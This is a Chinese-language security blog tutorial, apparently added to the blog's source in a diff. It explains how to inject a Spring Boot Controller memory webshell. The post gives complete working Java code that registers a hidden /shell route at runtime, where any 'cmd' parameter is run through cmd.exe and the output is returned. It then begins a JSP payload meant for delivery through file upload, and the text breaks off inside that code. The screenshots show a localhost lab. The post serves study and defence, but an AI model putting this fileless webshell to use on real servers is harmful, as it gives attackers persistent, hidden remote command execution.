+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">请求进来</span><br><span class="line">    ↓</span><br><span class="line">Tomcat Connector（接收请求）</span><br><span class="line">    ↓</span><br><span class="line">Valve（Tomcat管道，如AccessLogValve）</span><br><span class="line">    ↓</span><br><span class="line">Listener（ServletContextListener等）</span><br><span class="line">    ↓</span><br><span class="line">Filter（过滤器链）</span><br><span class="line">    ↓</span><br><span class="line">DispatcherServlet（Spring MVC入口，本质是个Servlet）</span><br><span class="line">    ↓</span><br><span class="line">HandlerInterceptor（Spring拦截器）preHandle</span><br><span class="line">    ↓</span><br><span class="line">Controller（业务逻辑）</span><br><span class="line">    ↓</span><br><span class="line">HandlerInterceptor（postHandle）</span><br><span class="line">    ↓</span><br><span class="line">返回响应</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对应关系：</p>
+<table>
+<thead>
+<tr>
+<th>Tomcat 层</th>
+<th>Spring 层</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Valve</td>
+<td>—</td>
+</tr>
+<tr>
+<td>Listener</td>
+<td>—</td>
+</tr>
+<tr>
+<td>Filter</td>
+<td>—</td>
+</tr>
+<tr>
+<td>Servlet</td>
+<td>DispatcherServlet</td>
+</tr>
+<tr>
+<td>—</td>
+<td>HandlerInterceptor</td>
+</tr>
+<tr>
+<td>—</td>
+<td>Controller</td>
+</tr>
+</tbody></table>
+<p>简单说就是 <code>DispatcherServlet</code> 类似一个分发器，请求会经过 <code>HandlerInterceptor</code> 这个拦截器，最后到达 Controller 控制器来返回响应。Interceptor 其实过<strong>两次</strong>：</p>
+<ul>
+<li><strong>preHandle</strong> — Controller 执行之前，可以在这里拦截请求，返回 false 就不往下走了</li>
+<li><strong>postHandle</strong> — Controller 执行之后，可以在这里修改响应</li>
+</ul>
+<p>所以 Spring Boot 的内存马比 Tomcat 多了两种：<strong>Interceptor 内存马</strong>和 <strong>Controller 内存马</strong>，加上继承的 Tomcat 那三种，一共五种：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Tomcat 内存马（3种）          Spring Boot 额外多的（2种）</span><br><span class="line">    ├── Filter                    ├── Interceptor</span><br><span class="line">    ├── Servlet                   └── Controller</span><br><span class="line">    └── Listener</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Interceptor 内存马注入的是 preHandle 阶段，请求一进来就执行命令，不需要特定路径，下篇再讲。这篇主要讲 Controller 内存马。</p>
+<hr>
+<h2 id="内存马原理"><a href="#内存马原理" class="headerlink" title="内存马原理"></a>内存马原理</h2><p><strong>正常 Spring 启动时的注册流程：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Spring 启动</span><br><span class="line">    ↓</span><br><span class="line">扫描所有 @Controller 类</span><br><span class="line">    ↓</span><br><span class="line">读取 @RequestMapping 注解</span><br><span class="line">    ↓</span><br><span class="line">自动调用 registerMapping() 往路由表里注册</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们要做的就是<strong>跳过前三步，直接执行第四步</strong>——先写一个恶意类，然后动态注册到 Web 服务器。</p>
+<p><strong>先理清两个容器（关键隔离）</strong></p>
+<ul>
+<li><strong>Spring 容器</strong>（<code>ApplicationContext</code> &#x2F; <code>DefaultListableBeanFactory</code>）：管理 Controller、Service、Component、Bean、SpringMVC 路由映射</li>
+<li><strong>Tomcat 容器</strong>（<code>StandardContext</code>）：管理原生 Servlet、Filter、Listener、Jar 资源、Tomcat 级阀门、上下文生命周期</li>
+</ul>
+<p>Spring Boot 是<strong>双容器嵌套</strong>，Spring 业务逻辑全部跑在 Spring 容器，仅 Web 底层通信依托 Tomcat，两者职责完全隔离。</p>
+<p><strong>和 Tomcat Servlet 内存马对比：</strong></p>
+<p>Tomcat Servlet 内存马：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建恶意 Servlet 实例</span></span><br><span class="line"><span class="type">EvilServlet</span> <span class="variable">evilServlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilServlet</span>();</span><br><span class="line"><span class="comment">// 2. 往 StandardContext 里注册</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">ctx</span> <span class="operator">=</span> ...;</span><br><span class="line">ctx.addServlet(<span class="string">&quot;evilServlet&quot;</span>, evilServlet);</span><br><span class="line">ctx.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>, <span class="string">&quot;evilServlet&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Spring Controller 内存马做的事完全一样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建恶意 Controller 实例</span></span><br><span class="line"><span class="type">EvilController</span> <span class="variable">evilController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>();</span><br><span class="line"><span class="comment">// 2. 往 HandlerMapping 里注册</span></span><br><span class="line">handlerMapping.registerMapping(mappingInfo, evilController, method);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p><strong><code>handlerMapping</code> — 路由表</strong></p>
+<p>记录了所有 URL 对应哪个 Controller，Spring 收到请求就来这里查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/hello  → HelloController.hello()</span><br><span class="line">/inject → InjectController.inject()</span><br><span class="line">/shell  → EvilController.shell()   ← 我们注入进去的</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>类比 Tomcat：相当于 <code>StandardContext</code>，里面存了所有 Servlet 的映射关系。</p>
+<p><strong><code>mappingInfo</code> — 路由规则</strong></p>
+<p>描述 <code>/shell</code> 这条路由长什么样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">    .paths(<span class="string">&quot;/shell&quot;</span>)                               <span class="comment">// 地址：/shell</span></span><br><span class="line">    .methods(RequestMethod.GET, RequestMethod.POST) <span class="comment">// 支持：GET 和 POST</span></span><br><span class="line">    .build();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>类比 Tomcat：相当于 <code>addServletMappingDecoded(&quot;/shell&quot;, &quot;evilServlet&quot;)</code> 里的路径参数。</p>
+<p><strong><code>method</code> — 具体方法（为什么要用反射）</strong></p>
+<p>Tomcat Servlet 收到请求固定走 <code>service()</code> 方法，Spring 不知道你的恶意类里叫什么方法，所以要用反射告诉它：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getMethod(</span><br><span class="line">    <span class="string">&quot;shell&quot;</span>,                    <span class="comment">// 方法名</span></span><br><span class="line">    HttpServletRequest.class,   <span class="comment">// 第一个参数类型</span></span><br><span class="line">    HttpServletResponse.class   <span class="comment">// 第二个参数类型</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿到这个 <code>method</code> 对象之后，Spring 有请求进来时就执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(evilController, request, response);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line">evilController.shell(request, response);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以 <code>handlerMapping.registerMapping(mappingInfo, evilController, method)</code> 就是新增一条 <code>/shell → EvilController.shell()</code> 的意思。</p>
+<p>因为 Spring Boot 是一类多方法（多路径）的，所以需要指定这个注册的路径对应的是 <code>evilController</code> 里的哪个方法，这是和 Tomcat Servlet 最本质的区别。</p>
+<p><strong>Spring MVC 参数自动注入机制</strong></p>
+<p><code>EvilController</code> 里的 <code>shell</code> 方法为什么需要 <code>request</code> 和 <code>response</code> 这两个参数？</p>
+<p><code>EvilController</code> 没有继承任何东西，参数不是”固定必须这样写”，而是因为我们需要这两个东西：一个用来取 URL 里的 <code>cmd</code> 参数，一个用来把命令执行结果写回浏览器。Spring MVC 有一套参数自动注入机制，只要方法参数是这些类型，Spring 都会自动填充：</p>
+<table>
+<thead>
+<tr>
+<th>参数类型</th>
+<th>Spring 自动注入的内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>HttpServletRequest</code></td>
+<td>当前请求对象</td>
+</tr>
+<tr>
+<td><code>HttpServletResponse</code></td>
+<td>当前响应对象</td>
+</tr>
+<tr>
+<td><code>HttpSession</code></td>
+<td>当前 Session</td>
+</tr>
+<tr>
+<td><code>@RequestParam String xxx</code></td>
+<td>URL 参数</td>
+</tr>
+<tr>
+<td><code>@PathVariable String xxx</code></td>
+<td>路径参数</td>
+</tr>
+</tbody></table>
+<p>把参数去掉也能注册成功，只是拿不到 <code>request</code>，也就没办法取 <code>cmd</code> 参数执行命令了。</p>
+<hr>
+<h2 id="Java-Demo-实现"><a href="#Java-Demo-实现" class="headerlink" title="Java Demo 实现"></a>Java Demo 实现</h2><p>先写一段 Java 的 Demo 代码试试，再写偏向实战的 JSP 代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demos.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InjectController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// handlerMapping 就是那张记录所有 URL 对应哪个 Controller 的表</span></span><br><span class="line">    <span class="comment">// 通过 @Autowired 直接注入，不用自己去容器里手动找</span></span><br><span class="line">    <span class="comment">// JSP 不支持注解，需要通过 WebApplicationContext 手动找容器（后面讲）</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RequestMappingHandlerMapping handlerMapping;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 普通 Java 类，没有任何注解，不走 Spring 扫描流程，直接手动注册</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">        <span class="comment">// 方法签名需要 request 和 response：</span></span><br><span class="line">        <span class="comment">// request — 用来拿用户传进来的参数（cmd）</span></span><br><span class="line">        <span class="comment">// response — 用来把命令执行结果写回浏览器</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">                <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="comment">// 取 URL 里 ?cmd=whoami 的值，和 Servlet 里的 request.getParameter() 一样</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="comment">// 防止 cmd 为空时执行空命令报错</span></span><br><span class="line">            <span class="comment">// != null — 有没有传 cmd 参数</span></span><br><span class="line">            <span class="comment">// !isEmpty() — 传了但不是空字符串</span></span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;</span><br><span class="line">                <span class="comment">// ProcessBuilder — Java 执行系统命令的类</span></span><br><span class="line">                <span class="comment">//cmd.exe — Windows 的命令解释器，Linux 换成 bash</span></span><br><span class="line">                <span class="comment">// /c — 执行后面的命令然后退出，Linux 换成 -c</span></span><br><span class="line">                <span class="comment">//cmd — 用户传进来的命令，比如 whoami</span></span><br><span class="line">                <span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">                <span class="comment">// 把错误输出合并到标准输出，命令执行报错也能在浏览器看到</span></span><br><span class="line">                pb.redirectErrorStream(<span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// JDK8 没有 readAllBytes()，用循环手动读，本质就是把命令执行结果从输出流读出来，写到 HTTP 响应里返回给浏览器。</span></span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> pb.start();<span class="comment">// 启动进程</span></span><br><span class="line">                java.io.<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> process.getInputStream();<span class="comment">// 拿到输出流</span></span><br><span class="line">                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();<span class="comment">// 缓冲区</span></span><br><span class="line">                <span class="type">byte</span>[] buf = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];<span class="comment">// 每次读 1024 字节</span></span><br><span class="line">                <span class="type">int</span> len;</span><br><span class="line">                <span class="keyword">while</span> ((len = is.read(buf)) != -<span class="number">1</span>)&#123;<span class="comment">// 循环读直到没有数据</span></span><br><span class="line">                    baos.write(buf, <span class="number">0</span>, len);<span class="comment">// 写进缓冲区</span></span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(baos.toString());<span class="comment">// 把结果写回浏览器</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提供一个 /inject 接口，模拟实战中的漏洞点，访问它就触发注入流程</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 1: 构造路由规则</span></span><br><span class="line">        <span class="comment">// BuilderConfiguration 是一个配置对象</span></span><br><span class="line">        <span class="comment">// setPatternParser 把当前路由表用的路径匹配引擎传进去，保证新注册的路由和已有路由用同一套匹配规则</span></span><br><span class="line">        <span class="comment">// Spring 5.3+ 之后路径匹配换了新引擎 PatternParser，不加这个 /shell 可能匹配不上</span></span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">options</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">        options.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line">        <span class="comment">// 构造一张路由规则卡片：</span></span><br><span class="line">        <span class="comment">// paths(&quot;/shell&quot;) — 路径是 /shell</span></span><br><span class="line">        <span class="comment">// methods(GET, POST) — 支持 GET 和 POST</span></span><br><span class="line">        <span class="comment">// options(options) — 用刚才的匹配规则</span></span><br><span class="line">        <span class="comment">// build() — 构建完成</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">                .paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                .methods(RequestMethod.GET, RequestMethod.POST)</span><br><span class="line">                .options(options)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Step 2: 注册进路由表</span></span><br><span class="line">        <span class="type">EvilController</span> <span class="variable">evilController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilController</span>();</span><br><span class="line">        <span class="comment">// 反射拿到 shell 方法对象，参数是方法名和参数类型列表</span></span><br><span class="line">        <span class="comment">// 告诉 Spring 注册的是 shell 这个方法，参数是 request 和 response</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getMethod(</span><br><span class="line">                <span class="string">&quot;shell&quot;</span>,</span><br><span class="line">                HttpServletRequest.class,</span><br><span class="line">                HttpServletResponse.class</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 三合一注册进路由表：</span></span><br><span class="line">        <span class="comment">// mappingInfo — 什么路径触发（/shell，GET/POST）</span></span><br><span class="line">        <span class="comment">// evilController — 交给谁处理（EvilController 实例）</span></span><br><span class="line">        <span class="comment">// method — 调哪个方法（shell）</span></span><br><span class="line">        handlerMapping.registerMapping(mappingInfo, evilController, method);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;注入成功！访问 /shell?cmd=whoami 验证&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>整个流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问 /inject</span><br><span class="line">    ↓</span><br><span class="line">从路由表拿 PatternParser → 构造 /shell 路由规则</span><br><span class="line">    ↓</span><br><span class="line">实例化 EvilController，反射拿到 shell 方法</span><br><span class="line">    ↓</span><br><span class="line">registerMapping() 注册进路由表</span><br><span class="line">    ↓</span><br><span class="line">访问 /shell?cmd=whoami → shell() 执行命令 → 结果返回浏览器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>访问 <code>http://localhost:8080/inject</code> 注册内存马：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427115600751.png"></p>
+<p>再次访问 <code>/inject</code> 会报错：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427115802084.png"></p>
+<p>这正是因为<strong>同一路径不能重复注册</strong>，第一次访问 <code>/inject</code> 时 <code>/shell</code> 注册成功，第二次再访问就冲突了。</p>
+<p>访问 <code>http://localhost:8080/shell?cmd=whoami</code> 触发命令：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427115711242.png"></p>
+<p>重启 Spring Boot 后再次访问 <code>/shell</code> 会直接 404，证明这是内存马效果，重启就没了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427120103386.png"></p>
+<blockquote>
+<p><strong>补充：Spring Boot 默认不暴露详细错误信息</strong>，只显示 <code>Whitelabel Error Page</code>。</p>
+<p>想看具体报错有两种方式：</p>
+<ul>
+<li><strong>方式一</strong>：看 IDEA 控制台，报错的完整堆栈都在控制台里</li>
+<li><strong>方式二</strong>：在 <code>application.properties</code> 里加配置（测试用，生产环境绝对不能开）：</li>
+</ul>
+<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.error.include-message</span>=<span class="string">always</span></span><br><span class="line"><span class="attr">server.error.include-stacktrace</span>=<span class="string">always</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这样浏览器也能看到具体报错，访问两次 <code>/inject</code> 就能看到详细的报错信息：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260427120653346.png"></p>
+<p>这也是渗透测试时遇到详细报错页面直接捡信息的原因。</p>
+</blockquote>
+<hr>
+<h2 id="获取-handlerMapping-的两种姿势"><a href="#获取-handlerMapping-的两种姿势" class="headerlink" title="获取 handlerMapping 的两种姿势"></a>获取 handlerMapping 的两种姿势</h2><p>因为 <code>RequestMappingHandlerMapping</code> 是 Spring 管理的 Bean，所有 Bean 都存在 <code>WebApplicationContext</code>（Spring 容器）里，动态注册用的 <code>registerMapping()</code> 也是它的方法，所以第一步是拿到它。</p>
+<p>类比 Filter 内存马：Filter 直接从 Tomcat 的 <code>StandardContext</code> 里取组件，Controller 内存马则是从 Spring 的 <code>WebApplicationContext</code> 里取组件，层级不同，思路一样。</p>
+<p><strong>姿势一：<code>@Autowired</code> 直接注入（Java 代码专用）</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> RequestMappingHandlerMapping handlerMapping;</span><br><span class="line"><span class="comment">// 直接拿到，不需要 WebApplicationContext</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>姿势二：<code>WebApplicationContextUtils</code>（JSP&#x2F;通用，推荐）</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一行：拿 Spring 容器</span></span><br><span class="line"><span class="comment">// request.getServletContext() — 从当前请求拿到 ServletContext，它是整个 Web 应用的全局对象，Tomcat 启动时就创建了</span></span><br><span class="line"><span class="comment">// WebApplicationContextUtils.getWebApplicationContext() — 工具类方法，从 ServletContext 里把 Spring 容器找出来</span></span><br><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> WebApplicationContextUtils</span><br><span class="line">        .getWebApplicationContext(request.getServletContext());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二行：从容器里取路由表</span></span><br><span class="line"><span class="comment">// context.getBean() — 从 Spring 容器里按类型取 Bean</span></span><br><span class="line"><span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span></span><br><span class="line">        context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>JSP 里没有 Spring 注解扫描，<code>@Autowired</code> 不生效，只能用姿势二手动取。</p>
+<hr>
+<h2 id="JSP-Payload-实现"><a href="#JSP-Payload-实现" class="headerlink" title="JSP Payload 实现"></a>JSP Payload 实现</h2><p>实战中肯定不是直接跑 Java 代码，需要依赖 JSP 文件上传。JSP 里只能写普通 Java 代码，不支持注解扫描，原因是注解（<code>@RestController</code>、<code>@Autowired</code> 这些）需要 Spring 容器扫描才能生效，而 JSP 是运行时动态执行的，不走 Spring 的扫描流程。</p>
+<p><strong>和 Java 版的区别：</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Java 版</th>
+<th>JSP 版</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>取路由表</td>
+<td><code>@Autowired</code> 自动注入</td>
+<td>手动从 <code>WebApplicationContext</code> 取</td>
+</tr>
+<tr>
+<td>代码包裹</td>
+<td>正常 Java 类</td>
+<td><code>&lt;%! %&gt;</code> 声明类，<code>&lt;% %&gt;</code> 执行代码</td>
+</tr>
+<tr>
+<td>导包</td>
+<td><code>import</code> 语句</td>
+<td><code>&lt;%@ page import=&quot;&quot; %&gt;</code></td>
+</tr>
+</tbody></table>
+<p>核心注册逻辑完全一样。</p>
+<p>文件路径：<code>src/main/webapp/inject_jsp.jsp</code></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.springframework.web.context.WebApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.springframework.web.context.request.RequestContextHolder&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.springframework.web.context.request.ServletRequestAttributes&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.RequestMappingInfo&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span 